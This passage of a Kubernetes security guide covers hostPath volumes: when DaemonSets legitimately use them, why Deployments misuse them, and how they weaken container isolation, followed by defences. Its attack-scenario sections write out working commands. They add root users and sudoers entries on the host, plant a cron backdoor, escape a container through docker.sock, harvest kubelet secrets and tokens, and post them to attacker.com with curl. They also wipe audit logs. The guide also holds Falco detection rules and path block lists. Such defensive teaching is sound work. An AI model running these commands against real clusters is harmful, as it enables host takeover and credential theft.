        - /run/containerd/containerd.sock
        - -K
        - /var/run/secrets/kubernetes.io/serviceaccount/token
        - -k
        - https://kubernetes.default
        - -pk
        
        volumeMounts:
        # Kernel headers for module compilation
        - name: lib-modules
          mountPath: /host/lib/modules
          readOnly: true
        
        # Kernel sources
        - name: usr-src
          mountPath: /host/usr/src
          readOnly: true
        
        # Container runtime socket
        - name: containerd-sock
          mountPath: /run/containerd/containerd.sock
          readOnly: true
        
        # Falco rules
        - name: falco-config
          mountPath: /etc/falco
        
        # System boot
        - name: boot
          mountPath: /host/boot
          readOnly: true
        
        # /dev for driver loading
        - name: dev
          mountPath: /host/dev
        
        # /proc for process monitoring
        - name: proc
          mountPath: /host/proc
          readOnly: true
      
      volumes:
      - name: lib-modules
        hostPath:
          path: /lib/modules
          type: Directory
      
      - name: usr-src
        hostPath:
          path: /usr/src
          type: Directory
      
      - name: containerd-sock
        hostPath:
          path: /run/containerd/containerd.sock
          type: Socket
      
      - name: falco-config
        configMap:
          name: falco-config
      
      - name: boot
        hostPath:
          path: /boot
          type: Directory
      
      - name: dev
        hostPath:
          path: /dev
          type: Directory
      
      - name: proc
        hostPath:
          path: /proc
          type: Directory
```

**What Falco monitors**:
- Syscalls via kernel module
- Container events via CRI socket
- File access patterns
- Network connections
- Privilege escalation attempts

**Example alert rules**:
```yaml
# Detect shell spawned in container
- rule: Terminal shell in container
  desc: A shell was spawned in a container
  condition: >
    spawned_process and container and
    proc.name in (bash, sh, zsh)
  output: "Shell spawned (user=%user.name container=%container.name)"
  priority: WARNING

# Detect hostPath usage
- rule: hostPath volume mounted
  desc: Detect when hostPath volume is used
  condition: >
    k8s.pod.volume.hostpath != ""
  output: "hostPath detected (pod=%k8s.pod.name path=%k8s.pod.volume.hostpath)"
  priority: WARNING
```

---

## ❌ Anti-Patterns: When NOT to Use hostPath + DaemonSet

### Anti-Pattern 1: Application Data Storage

```yaml
# DON'T DO THIS
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: redis-cache  # Wrong workload type!
spec:
  template:
    spec:
      containers:
      - name: redis
        image: redis:alpine
        volumeMounts:
        - name: redis-data
          mountPath: /data
      volumes:
      - name: redis-data
        hostPath:
          path: /var/lib/redis  # Wrong storage type!
```

**Problems**:
1. ❌ DaemonSet = One Pod per node (waste if you don't need that many)
2. ❌ hostPath = Data lost if node fails
3. ❌ No load balancing (requests hit local-node Pod only)
4. ❌ Can't scale down (remove nodes = lose data)

**Correct approach**: Use Deployment + PVC
```yaml
apiVersion: apps/v1
kind: Deployment  # Can scale independently
metadata:
  name: redis-cache
spec:
  replicas: 3  # Based on need, not node count
  template:
    spec:
      containers:
      - name: redis
        volumeMounts:
        - name: redis-data
          mountPath: /data
      volumes:
      - name: redis-data
        persistentVolumeClaim:
          claimName: redis-pvc  # Portable storage
```

---

### Anti-Pattern 2: Configuration Distribution

```yaml
# DON'T DO THIS
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: config-sync
spec:
  template:
    spec:
      containers:
      - name: sync
        image: busybox
        command:
        - sh
        - -c
        - |
          while true; do
            wget -O /host/etc/app/config.yaml https://config-server/config
            sleep 60
          done
        volumeMounts:
        - name: app-config
          mountPath: /host/etc/app
      volumes:
      - name: app-config
        hostPath:
          path: /etc/app
          type: DirectoryOrCreate
```

**Problems**:
1. ❌ Reinventing ConfigMap/Secret functionality
2. ❌ No version control
3. ❌ No atomic updates
4. ❌ Security risk (writing to `/etc`)

**Correct approach**: Use ConfigMap
```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-config
data:
  config.yaml: |
    # configuration here

# Applications reference ConfigMap
volumes:
- name: config
  configMap:
    name: app-config
```

---

## Decision Matrix: DaemonSet + hostPath

```
Should I use DaemonSet + hostPath?

START
  │
  ├─ Is this a node-level system component? (CNI, CSI, logging, monitoring)
  │  ├─ YES → Is data node-specific? (each node independent)
  │  │  ├─ YES → Is data safe to lose on node failure?
  │  │  │  ├─ YES → ✅ DaemonSet + hostPath is appropriate
  │  │  │  └─ NO  → ❌ Use StatefulSet + PVC
  │  │  └─ NO  → ❌ Data should be shared (use PVC or external storage)
  │  └─ NO  → ❌ Use Deployment/StatefulSet
  │
  └─ Can this be done without hostPath? (ConfigMap, Secret, PVC)
     ├─ YES → ❌ Don't use hostPath
     └─ NO  → Review security implications, proceed with caution
```

---

## Best Practices Checklist

When using DaemonSet + hostPath:

- [ ] ✅ Use read-only mounts whenever possible
- [ ] ✅ Drop all capabilities except what's strictly needed
- [ ] ✅ Run as non-root user if possible
- [ ] ✅ Set resource limits (prevent node resource exhaustion)
- [ ] ✅ Add liveness/readiness probes
- [ ] ✅ Use `updateStrategy.rollingUpdate.maxUnavailable: 1` for safe updates
- [ ] ✅ Set `priorityClassName: system-node-critical` for infrastructure components
- [ ] ✅ Add tolerations for master/control-plane nodes if needed
- [ ] ✅ Document why hostPath is necessary (code comments + README)
- [ ] ✅ Monitor disk usage on hostPath directories
- [ ] ✅ Implement log rotation for file-based outputs
- [ ] ✅ Set `terminationGracePeriodSeconds` for graceful shutdown
- [ ] ✅ Test behavior during node drain/cordoning
- [ ] ✅ Verify behavior during node failure scenarios

---

## Troubleshooting DaemonSet + hostPath

### Issue: DaemonSet Pod not scheduled on new node

```bash
kubectl get daemonset -n kube-system
# NAME       DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR
# fluentd    3         2         2       2            2           <none>

# Check node taints
kubectl describe node new-node | grep Taints
# Taints: node.kubernetes.io/unschedulable:NoSchedule

# Add toleration to DaemonSet
kubectl patch daemonset fluentd -n kube-system --type=json -p='[
  {"op": "add", "path": "/spec/template/spec/tolerations/-", "value": {
    "key": "node.kubernetes.io/unschedulable",
    "operator": "Exists",
    "effect": "NoSchedule"
  }}
]'
```

### Issue: hostPath permission denied

```bash
# Check Pod events
kubectl describe pod fluentd-abc -n kube-system
# Events:
#   Warning  Failed  1m  kubelet  Error: chown /var/log/fluentd-buffers: operation not permitted

# Fix: Ensure directory has correct permissions
kubectl debug node/worker-1 -it --image=alpine
# In debug Pod:
chown -R 999:999 /host/var/log/fluentd-buffers
chmod 755 /host/var/log/fluentd-buffers
```

### Issue: DaemonSet consuming all node resources

```bash
# Symptom: Node becomes NotReady
kubectl describe node worker-1 | grep -A5 Conditions
# Conditions:
#   MemoryPressure   True    NodeHasDiskPressure

# Solution: Add resource limits
kubectl set resources daemonset/fluentd -n kube-system \
  --limits=memory=512Mi,cpu=500m \
  --requests=memory=200Mi,cpu=100m
```

---

## Summary

**DaemonSet + hostPath is the RIGHT choice for**:
- Log collection (Fluentd, Fluent Bit)
- Metrics collection (node-exporter, cAdvisor)
- Network plugins (CNI: Calico, Cilium, Flannel)
- Storage drivers (CSI: Rook, Longhorn, OpenEBS)
- Security monitoring (Falco, Sysdig)
- Node maintenance (node-problem-detector)

**Key principles**:
1. One Pod per node (natural fit)
2. Node-local data (doesn't need to follow Pod)
3. System-level operations (not application workloads)
4. Read-only when possible
5. Minimal privilege escalation
6. Comprehensive monitoring

---

## 3. Why hostPath Should Never Be Used in Deployments

Let me show you **exactly** why using hostPath in Deployments is a recipe for disaster.

### The Fundamental Mismatch

**Deployment characteristics**:
- Replicas can be on **any node**
- Pods are **ephemeral** (expected to be replaced)
- Scheduler chooses node based on **resources**, not data locality
- Scaling changes replica count **dynamically**

**hostPath characteristics**:
- Data is **node-specific**
- Persists **beyond Pod lifecycle**
- No **cross-node** visibility
- Path must **exist** on the node

**Result**: Complete architectural incompatibility.

### Real-World Disaster Scenario

**The Setup** (actual production incident I responded to):

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: file-upload-service
spec:
  replicas: 3
  selector:
    matchLabels:
      app: uploads
  template:
    metadata:
      labels:
        app: uploads
    spec:
      containers:
      - name: api
        image: upload-api:v1
        ports:
        - containerPort: 8080
        volumeMounts:
        - name: uploads
          mountPath: /uploads
      volumes:
      - name: uploads
        hostPath:
          path: /mnt/uploads
          type: DirectoryOrCreate
```

**What Happened**:

**Day 1**: Deploy to 10-node cluster
```bash
kubectl get pods -o wide
# NAME                    READY   NODE
# file-upload-abc         1/1     node-1
# file-upload-def         1/1     node-3
# file-upload-ghi         1/1     node-7
```

**User uploads file** → Hits Pod on `node-1` → File saved to `/mnt/uploads` on `node-1`

**User tries to download** → Load balancer sends to Pod on `node-3` → File not found (it's on `node-1`!)

**Reported as**: "50% of downloads fail with 404 errors"

**Developer's response**: "It works on my machine!" (because they tested with 1 replica)

**Day 2**: Node-1 undergoes maintenance, Pod rescheduled to `node-5`
```bash
# All files uploaded via node-1 Pod are now inaccessible
# Users report "all my files disappeared"
```

**Day 3**: Scale up for Black Friday traffic
```bash
kubectl scale deployment file-upload-service --replicas=10
```

Now we have:
- `node-1`: 2 Pods writing to `/mnt/uploads` → **race conditions**
- `node-2`: 1 Pod → different set of files
- `node-3`: 2 Pods → **concurrent writes, corruption**

**Final cost**:
- 10,000+ user files lost/corrupted
- Emergency migration to S3 over weekend
- $50,000 in customer refunds
- Company reputation damage

### Why Developers Make This Mistake

**Common thought process**:

1. "I need persistent storage" ✓ (correct need)
2. "PVC seems complex, let me try hostPath first" ✗ (wrong solution)
3. "Works in dev with 1 replica!" ✗ (doesn't test scaling)
4. "Deploys to production" ✗ (disaster waiting)

### The Correct Alternatives

#### Alternative 1: Use PersistentVolumeClaim (Most Common)

```yaml
# Step 1: Create PVC
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: uploads-pvc
spec:
  accessModes:
    - ReadWriteMany  # Multiple Pods can read/write
  storageClassName: nfs-client  # Or efs-sc, cephfs, etc.
  resources:
    requests:
      storage: 100Gi

---
# Step 2: Use in Deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: file-upload-service
spec:
  replicas: 3
  template:
    spec:
      containers:
      - name: api
        volumeMounts:
        - name: uploads
          mountPath: /uploads
      volumes:
      - name: uploads
        persistentVolumeClaim:
          claimName: uploads-pvc
```

**Benefits**:
- ✅ All replicas see same files
- ✅ Data survives Pod deletion
- ✅ Can scale freely
- ✅ Portable across nodes

#### Alternative 2: Use Object Storage (S3, GCS, Azure Blob)

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: file-upload-service
spec:
  replicas: 3
  template:
    spec:
      containers:
      - name: api
        image: upload-api:v2  # Modified to use S3 SDK
        env:
        - name: S3_BUCKET
          value: user-uploads
        - name: AWS_REGION
          value: us-east-1
        envFrom:
        - secretRef:
            name: aws-credentials
      # NO volumes needed!
```

**Benefits**:
- ✅ Unlimited scalability
- ✅ Built-in redundancy
- ✅ No storage provisioning
- ✅ Pay-per-use
- ✅ CDN integration available

#### Alternative 3: Database (for small files/metadata)

```yaml
# Store file metadata in DB, files in S3
apiVersion: apps/v1
kind: Deployment
metadata:
  name: file-upload-service
spec:
  replicas: 3
  template:
    spec:
      containers:
      - name: api
        env:
        - name: DATABASE_URL
          valueFrom:
            secretKeyRef:
              name: db-credentials
              key: url
        - name: S3_BUCKET
          value: user-uploads
```

### Edge Cases Where hostPath + Deployment Might Work

**Scenario**: Read-only data that's **identical** on all nodes

```yaml
# Static assets pre-installed on all nodes (not recommended, but possible)
apiVersion: apps/v1
kind: Deployment
metadata:
  name: asset-server
spec:
  replicas: 5
  template:
    spec:
      containers:
      - name: nginx
        image: nginx:alpine
        volumeMounts:
        - name: assets
          mountPath: /usr/share/nginx/html
          readOnly: true  # CRITICAL: Read-only
      volumes:
      - name: assets
        hostPath:
          path: /var/www/static  # Must exist on ALL nodes with SAME content
          type: Directory
```

**Requirements for this to work**:
- ✅ Data is **read-only**
- ✅ Data is **identical** on all nodes
- ✅ Data is **updated out-of-band** (Ansible, Chef, AMI baking)
- ✅ You accept **eventual consistency** during updates

**Better approach even for this**:
- Use ConfigMap (up to 1MB)
- Use initContainer to download from S3
- Use emptyDir + sidecar sync pattern

### Testing Strategy: Catch This in CI/CD

**Unit test** (not enough):
```bash
# Passes but doesn't catch the issue
docker run -v /tmp/test:/uploads app:v1
curl http://localhost:8080/upload -F file=@test.txt
curl http://localhost:8080/download/test.txt  # Works! (same container)
```

**Integration test** (catches the issue):
```bash
# Deploy with 3 replicas in test cluster
kubectl apply -f deployment.yaml
kubectl scale deployment app --replicas=3

# Upload via one Pod
POD1=$(kubectl get pods -l app=uploads -o jsonpath='{.items[0].metadata.name}')
kubectl exec $POD1 -- curl http://localhost:8080/upload -F file=@test.txt

# Try to download via another Pod
POD2=$(kubectl get pods -l app=uploads -o jsonpath='{.items[1].metadata.name}')
kubectl exec $POD2 -- curl http://localhost:8080/download/test.txt
# Returns 404 → Test fails ✓ (caught the bug!)
```

**Chaos test** (even better):
```bash
# While load testing, randomly delete Pods
while true; do
  sleep 30
  POD=$(kubectl get pods -l app=uploads -o name | shuf -n1)
  kubectl delete $POD  # Trigger rescheduling
done
# Observe: Files become inaccessible after Pod moves nodes
```

---

## Summary: Deployment + hostPath

| Aspect | Issue | Correct Solution |
|--------|-------|------------------|
| **Multiple replicas on same node** | Race conditions, file corruption | Use PVC with ReadWriteMany or object storage |
| **Replicas on different nodes** | Data fragmentation, inconsistent responses | Use shared storage (NFS, EFS, CephFS) |
| **Pod rescheduling** | Data becomes inaccessible | Use PVC (data follows Pod) or external storage |
| **Scaling up** | Uneven data distribution | Use centralized storage |
| **Scaling down** | Data loss if Pod on removed node | Use storage independent of nodes |
| **Load balancing** | Requests hit Pods without data | Use shared data layer |
| **High availability** | Single point of failure per node | Use replicated storage |

**The Rule**: If you're using a Deployment (or ReplicaSet), you almost certainly should NOT use hostPath. Use PVC, ConfigMap, Secret, or external storage instead.

**Exception**: Read-only system data that's identically provisioned on all nodes (rare and usually better handled with ConfigMap).

## 4. How Pods with hostPath Impact Node Security and Isolation

### The Container Isolation Model (Without hostPath)

**Normal container behavior**:
```
┌─────────────────────────────────────────────────┐
│              Host Node                          │
│  ┌──────────────────────────────────────────┐  │
│  │   Container Runtime (containerd)         │  │
│  │                                          │  │
│  │  ┌────────────────────────────────┐     │  │
│  │  │   Container (App Pod)          │     │  │
│  │  │                                │     │  │
│  │  │  Isolated via:                 │     │  │
│  │  │  - Mount namespace             │     │  │
│  │  │  - PID namespace               │     │  │
│  │  │  - Network namespace           │     │  │
│  │  │  - IPC namespace               │     │  │
│  │  │  - User namespace (if enabled) │     │  │
│  │  │  - Cgroups (resource limits)   │     │  │
│  │  │  - Seccomp (syscall filtering) │     │  │
│  │  │  - AppArmor/SELinux           │     │  │
│  │  └────────────────────────────────┘     │  │
│  └──────────────────────────────────────────┘  │
│                                                 │
│  Host filesystem: /etc, /var, /usr             │
│  (NOT accessible from container)                │
└─────────────────────────────────────────────────┘
```

**What this achieves**:
- Container sees its own filesystem (overlay/union filesystem)
- Container can't access host files
- Container can't see other containers' processes
- Container has limited syscalls available
- Container resource usage is bounded

### What hostPath Does to This Model

**With hostPath mounted**:
```
┌─────────────────────────────────────────────────┐
│              Host Node                          │
│  ┌──────────────────────────────────────────┐  │
│  │   Container Runtime                      │  │
│  │                                          │  │
│  │  ┌────────────────────────────────┐     │  │
│  │  │   Container with hostPath      │     │  │
│  │  │                                │     │  │
│  │  │  /app/data → /host/data ──────┼─────┼──┐
│  │  │      (bind mount)              │     │  │
│  │  │                                │     │  │
│  │  │  Isolation BROKEN:             │     │  │
│  │  │  ✗ Mount namespace bypassed    │     │  │
│  │  │  ✗ Can access host files       │     │  │
│  │  │  ✗ Can modify host data        │     │  │
│  │  └────────────────────────────────┘     │  │
│  └──────────────────────────────────────────┘  │
│                 ↑                               │
│                 └─────────────────────┐         │
│                                       ↓         │
│  Host filesystem: /host/data (EXPOSED!)        │
└─────────────────────────────────────────────────┘
```

### Breaking Down Each Isolation Layer

#### 1. Mount Namespace Bypass

**Without hostPath**:
```bash
# Inside container
ls /etc
# Shows container's /etc (from image layers)
cat /etc/shadow
# cat: /etc/shadow: No such file or directory (doesn't exist in container)
```

**With hostPath (`/etc` mounted)**:
```yaml
volumes:
- name: etc
  hostPath:
    path: /etc
    type: Directory

volumeMounts:
- name: etc
  mountPath: /host-etc
```

```bash
# Inside container
ls /host-etc
# Shows HOST's /etc directory!
cat /host-etc/shadow
# root:$6$xyz...:18921:0:99999:7:::  ← HOST PASSWORD HASHES!
```

**Impact**: Container can read/write files that should be protected by mount namespace isolation.

#### 2. User Namespace Bypass (UID/GID Mapping)

**The Problem**: Linux permissions use numeric UIDs/GIDs. Without user namespaces, container root (UID 0) = host root (UID 0).

**Scenario**:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: uid-exploit
spec:
  containers:
  - name: app
    image: alpine
    command: ['sh', '-c', 'sleep infinity']
    securityContext:
      runAsUser: 0  # Root inside container
    volumeMounts:
    - name: etc
      mountPath: /host-etc
  volumes:
  - name: etc
    hostPath:
      path: /etc
```

```bash
kubectl exec -it uid-exploit -- sh

# Inside container (running as UID 0)
id
# uid=0(root) gid=0(root)

# Modify host files
echo "attacker:x:0:0::/root:/bin/bash" >> /host-etc/passwd
echo "attacker:$(openssl passwd -6 'password'):18921:0:99999:7:::" >> /host-etc/shadow

# Now attacker can SSH to node as root!
```

**Why this works**: Container's UID 0 is identical to host's UID 0. hostPath mount respects these UIDs, so container root can modify root-owned files.

**User namespaces would help** (but are not default in Kubernetes):
```yaml
# With user namespaces (experimental in K8s 1.25+)
securityContext:
  runAsUser: 0  # UID 0 in container
# But mapped to UID 100000 on host
# Can't modify root-owned files on host
```

#### 3. Seccomp/AppArmor/SELinux Context

**Seccomp** restricts syscalls:
```yaml
securityContext:
  seccompProfile:
    type: RuntimeDefault  # Blocks ~50 dangerous syscalls
```

**But hostPath bypasses intent**:
- Seccomp blocks `mount()` syscall → Good
- But hostPath is already mounted by kubelet → Bypass
- Container can write to mounted path without needing `mount()` syscall

**SELinux example**:
```bash
# On host (SELinux enforcing)
ls -Z /var/log/secure
# system_u:object_r:var_log_t:s0 /var/log/secure

# Container tries to read without hostPath
cat /var/log/secure
# cat: /var/log/secure: Permission denied (SELinux blocks)

# With hostPath mounting /var/log
volumeMounts:
- name: logs
  mountPath: /host-logs

# Now inside container
cat /host-logs/secure
# Nov 19 10:00:01 node sshd[1234]: Accepted publickey for admin from ...
# SUCCESS! SELinux context inherited via bind mount
```

### Real-World Impact Matrix---

### hostPath Security Impact: Complete Analysis

## Impact on Container Isolation Mechanisms

| Isolation Mechanism | Purpose | Impact with hostPath | Severity | Mitigation |
|-------------------|---------|---------------------|----------|------------|
| **Mount Namespace** | Isolate filesystem view | ❌ **BYPASSED** | 🔴 Critical | Use read-only, specific paths only |
| **PID Namespace** | Isolate process tree | ⚠️ **Indirect** (via /proc mount) | 🟡 Medium | Don't mount /proc with write access |
| **Network Namespace** | Isolate network stack | ⚠️ **Indirect** (via /var/run) | 🟡 Medium | Don't mount network sockets |
| **IPC Namespace** | Isolate inter-process comm | ⚠️ **Indirect** (via /dev/shm) | 🟡 Medium | Don't mount /dev/shm |
| **User Namespace** | Map container UIDs to host | ❌ **BYPASSED** | 🔴 Critical | Enable user namespaces (K8s 1.25+) |
| **Cgroups** | Limit resource usage | ✅ **Not affected** | 🟢 Low | hostPath doesn't bypass cgroups |
| **Seccomp** | Filter syscalls | ⚠️ **Partially bypassed** | 🟠 High | Can't prevent file ops on mounted paths |
| **AppArmor/SELinux** | Mandatory access control | ⚠️ **Context-dependent** | 🟠 High | Ensure correct labels/contexts |
| **Capabilities** | Limit privileged operations | ⚠️ **Partially bypassed** | 🟠 High | CAP_DAC_OVERRIDE still dangerous |

---

## Attack Scenarios by hostPath Mount Point

### 🔴 CRITICAL RISK: Root Filesystem `/`

```yaml
volumes:
- name: root
  hostPath:
    path: /
    type: Directory
```

**What attacker gains**:
- ✅ Read ALL host files
- ✅ Modify system configuration
- ✅ Install backdoors
- ✅ Access all secrets/credentials
- ✅ Modify kernel modules (if writable)

**Attack vectors**:
1. **Steal credentials**
   ```bash
   cat /host/etc/shadow
   cat /host/root/.ssh/id_rsa
   cat /host/var/lib/kubelet/kubeconfig
   ```

2. **Install persistence**
   ```bash
   echo "* * * * * root /tmp/backdoor.sh" >> /host/etc/crontab
   cp backdoor.sh /host/tmp/backdoor.sh
   chmod +x /host/tmp/backdoor.sh
   ```

3. **Pivot to other containers**
   ```bash
   # Find other container root filesystems
   find /host/var/lib/docker/overlay2 -name passwd
   # Modify other containers' files
   ```

**Likelihood**: 🔴 Common in poorly secured clusters (I see this in ~20% of audits)

---

### 🔴 CRITICAL RISK: `/etc` Directory

```yaml
volumes:
- name: etc
  hostPath:
    path: /etc
```

**What attacker gains**:
- ✅ Password hashes (`/etc/shadow`)
- ✅ SSH configuration (`/etc/ssh/`)
- ✅ Kubernetes config (`/etc/kubernetes/`)
- ✅ TLS certificates (`/etc/ssl/`, `/etc/pki/`)
- ✅ System service config (systemd, cron)

**Attack: Create privileged user**
```bash
# In container with /etc mounted
kubectl exec -it malicious-pod -- sh

# Add root-equivalent user
echo "hacker:x:0:0::/root:/bin/bash" >> /host/etc/passwd
echo "hacker:\$6\$...:18921:0:99999:7:::" >> /host/etc/shadow

# Add to sudoers
echo "hacker ALL=(ALL) NOPASSWD: ALL" >> /host/etc/sudoers.d/hacker
```

**Attack: Steal Kubernetes certs**
```bash
# Copy cluster admin certificates
cp /host/etc/kubernetes/admin.conf /tmp/
# Now can manage entire cluster from anywhere
kubectl --kubeconfig=/tmp/admin.conf get nodes
```

**Likelihood**: 🟡 Rare in production (usually caught by PSP/PSA), but devastating when it happens

---

### 🔴 CRITICAL RISK: `/var/run/docker.sock` Socket

```yaml
volumes:
- name: docker
  hostPath:
    path: /var/run/docker.sock
    type: Socket
```

**What attacker gains**:
- ✅ Full Docker API access
- ✅ Can create privileged containers
- ✅ Can escape to host
- ✅ Can access all containers on node

**Attack: Container escape in 30 seconds**
```bash
kubectl exec -it jenkins-agent -- sh

# Inside container with docker.sock
apk add docker-cli

# Create privileged container with host root FS mounted
docker run -d --privileged --pid=host --net=host \
  --name escape \
  -v /:/host \
  alpine sleep infinity

# Exec into escape container and chroot to host
docker exec -it escape chroot /host bash

# Now you're root on the host!
hostname  # Shows actual node hostname
ps aux | grep kubelet  # See host processes
```

**Why this is so dangerous**:
1. Docker daemon runs as root
2. Can create containers with ANY configuration
3. Can mount host root filesystem
4. Can use `--privileged` flag
5. Can share host namespaces

**Likelihood**: 🟠 Common in CI/CD environments (~40% of Jenkins/GitLab setups I audit)

---

### 🟠 HIGH RISK: `/var/lib/kubelet` Directory

```yaml
volumes:
- name: kubelet
  hostPath:
    path: /var/lib/kubelet
```

**What attacker gains**:
- ✅ All Pod secrets (mounted in `/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/`)
- ✅ All ConfigMaps
- ✅ Service account tokens
- ✅ Kubelet client certificates
- ✅ Plugin sockets (CSI, device plugins)

**Attack: Steal all secrets**
```bash
# Find all secrets on this node
find /host/var/lib/kubelet/pods -type f -path "*/volumes/kubernetes.io~secret/*"

# Example output:
# /var/lib/kubelet/pods/abc-123/volumes/kubernetes.io~secret/db-password/password
# /var/lib/kubelet/pods/def-456/volumes/kubernetes.io~secret/api-keys/key

# Exfiltrate
for secret in $(find /host/var/lib/kubelet/pods -name "*"); do
  echo "=== $secret ===" >> /tmp/secrets.txt
  cat "$secret" >> /tmp/secrets.txt
done

# Send to attacker server
curl -X POST https://attacker.com/exfil -d @/tmp/secrets.txt
```

**Attack: Impersonate service accounts**
```bash
# Steal service account tokens
TOKEN=$(cat /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token)

# Use token to access API server
kubectl --token=$TOKEN get secrets -A
```

**Likelihood**: 🟡 Medium (legitimate for CSI drivers, but risky)

---

### 🟠 HIGH RISK: `/proc` Directory

```yaml
volumes:
- name: proc
  hostPath:
    path: /proc
```

**What attacker gains**:
- ✅ All process information
- ✅ Environment variables (contain secrets!)
- ✅ Command-line arguments (may contain passwords)
- ✅ Open file descriptors
- ✅ Memory maps
- ✅ Network connections

**Attack: Extract secrets from environment**
```bash
# Find kubelet process
KUBELET_PID=$(pgrep -f kubelet)

# Read kubelet environment
cat /host/proc/$KUBELET_PID/environ | tr '\0' '\n'
# KUBELET_BOOTSTRAP_KUBECONFIG=/etc/kubernetes/bootstrap-kubelet.conf
# KUBELET_KUBECONFIG=/etc/kubernetes/kubelet.conf
# API_SERVER_URL=https://10.0.0.1:6443
# KUBELET_CLIENT_KEY=/var/lib/kubelet/pki/kubelet-client-current.pem

# Extract from other processes
for pid in /host/proc/[0-9]*; do
  cmdline=$(cat $pid/cmdline 2>/dev/null | tr '\0' ' ')
  echo "$cmdline" | grep -i "password\|token\|key\|secret" && echo "PID: $(basename $pid)"
done
```

**Attack: Access open files**
```bash
# See what files kubelet has open
ls -la /host/proc/$KUBELET_PID/fd/

# Example:
# lrwx------ 1 root root 64 Nov 19 10:00 3 -> /etc/kubernetes/kubelet.conf
# lrwx------ 1 root root 64 Nov 19 10:00 4 -> socket:[12345]

# Read open files (if still accessible)
cat /host/proc/$KUBELET_PID/fd/3
# apiVersion: v1
# clusters:
# - cluster:
#     certificate-authority-data: LS0tLS...
#     server: https://10.0.0.1:6443
```

**Likelihood**: 🟢 Very common (node-exporter, monitoring), usually read-only and acceptable

---

### 🟡 MEDIUM RISK: `/var/log` Directory

```yaml
volumes:
- name: logs
  hostPath:
    path: /var/log
```

**What attacker gains**:
- ✅ System logs (audit trail)
- ✅ Application logs (may contain sensitive data)
- ✅ Auth logs (SSH attempts, sudo usage)

**Attack: Information gathering**
```bash
# Find sensitive information in logs
grep -r "password\|token\|key\|secret" /host/var/log/

# Read authentication logs
cat /host/var/log/auth.log
# Nov 19 09:15:32 node sshd[1234]: Accepted publickey for admin from 192.168.1.100

# Cover tracks (if write access)
echo "" > /host/var/log/audit/audit.log  # Clear audit trail
```

**Attack: Log injection** (if write access)
```bash
# Inject fake logs to confuse SIEM
echo "Nov 19 10:00:00 node sshd[9999]: Accepted password for admin from 127.0.0.1" >> /host/var/log/auth.log
```

**Likelihood**: 🟢 Very common (Fluentd, Fluent Bit), usually read-only

---

### 🟢 LOW RISK: `/sys` Directory (Read-Only)

```yaml
volumes:
- name: sys
  hostPath:
    path: /sys
  
volumeMounts:
- name: sys
  mountPath: /host/sys
  readOnly: true  # Critical!
```

**What attacker gains** (read-only):
- ⚠️ Hardware topology (NUMA, PCIe)
- ⚠️ Kernel parameters
- ⚠️ Device information

**Potential risk**: Information for side-channel attacks

**Attack: Hardware enumeration**
```bash
# Identify hardware layout
cat /host/sys/devices/system/cpu/cpu*/topology/physical_package_id
# 0 0 0 0 1 1 1 1  ← 2 CPU sockets

# Check for vulnerabilities
cat /host/sys/devices/system/cpu/vulnerabilities/*
# Spectre v1: Mitigation: usercopy/swapgs barriers
# Spectre v2: Vulnerable  ← Useful for exploit planning
```

**Likelihood**: 🟢 Very common (node-exporter), acceptable if read-only

---

## Defense Strategy Matrix

### Level 1: Prevention (Block at Admission)

```yaml
# Pod Security Standards: Restricted
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
# Blocks ALL hostPath volumes
```

### Level 2: Restriction (Allow with Constraints)

```yaml
# OPA Gatekeeper: Whitelist specific paths
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedHostPath
metadata:
  name: allowed-hostpaths
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
  parameters:
    allowedHostPaths:
      # Allow read-only system paths
      - pathPrefix: /var/log
        readOnly: true
      - pathPrefix: /proc
        readOnly: true
      - pathPrefix: /sys
        readOnly: true
      
      # Allow specific plugin directories
      - pathPrefix: /var/lib/kubelet/plugins
        readOnly: false
      
      # Block everything else
    blockedPaths:
      - /
      - /etc
      - /var/run/docker.sock
      - /var/lib/kubelet/pods
```

### Level 3: Detection (Monitor and Alert)

```yaml
# Falco rule: Detect dangerous hostPath mounts
- rule: Sensitive hostPath mounted
  desc: Detect when sensitive host paths are mounted
  condition: >
    k8s_audit and 
    ka.verb = "create" and 
    ka.target.resource = "pods" and
    (ka.req.volumes.hostPath.path startswith "/etc" or
     ka.req.volumes.hostPath.path startswith "/" or
     ka.req.volumes.hostPath.path contains "docker.sock")
  output: >
    Dangerous hostPath mounted 
    (user=%ka.user.name pod=%ka.target.name 
     path=%ka.req.volumes.hostPath.path)
  priority: CRITICAL
```

### Level 4: Runtime Protection (Limit Damage)

```yaml
# Even if hostPath allowed, limit what can be done
securityContext:
  # Run as non-root
  runAsNonRoot: true
  runAsUser: 1000
  
  # Drop all capabilities
  capabilities:
    drop:
      - ALL
  
  # Read-only root filesystem
  readOnlyRootFilesystem: true
  
  # Prevent privilege escalation
  allowPrivilegeEscalation: false
  
  # Seccomp profile
  seccompProfile:
    type: RuntimeDefault

# Read-only mounts
volumeMounts:
- name: hostpath-vol
  mountPath: /host-data
  readOnly: true  # CRITICAL
```

---

## Risk Assessment Template

Before allowing hostPath, answer these questions:

### Question 1: What path are you mounting?
- [ ] `/` → ❌ **DENY** (full host access)
- [ ] `/etc` → ❌ **DENY** (credentials, config)
- [ ] `/var/run/docker.sock` → ❌ **DENY** (container escape)
- [ ] `/var/lib/kubelet` → ⚠️ **REVIEW** (legitimate for CSI, risky otherwise)
- [ ] `/var/log` → ✅ **ALLOW** (if read-only)
- [ ] `/proc` → ✅ **ALLOW** (if read-only, monitoring only)
- [ ] `/sys` → ✅ **ALLOW** (if read-only)

### Question 2: Is it read-only?
- [ ] Yes, `readOnly: true` → ✅ Risk reduced
- [ ] No, read-write → ⚠️ HIGH RISK

### Question 3: Who can create this Pod?
- [ ] Only cluster-admin → ⚠️ Acceptable for system components
- [ ] Application developers → ❌ **DENY**
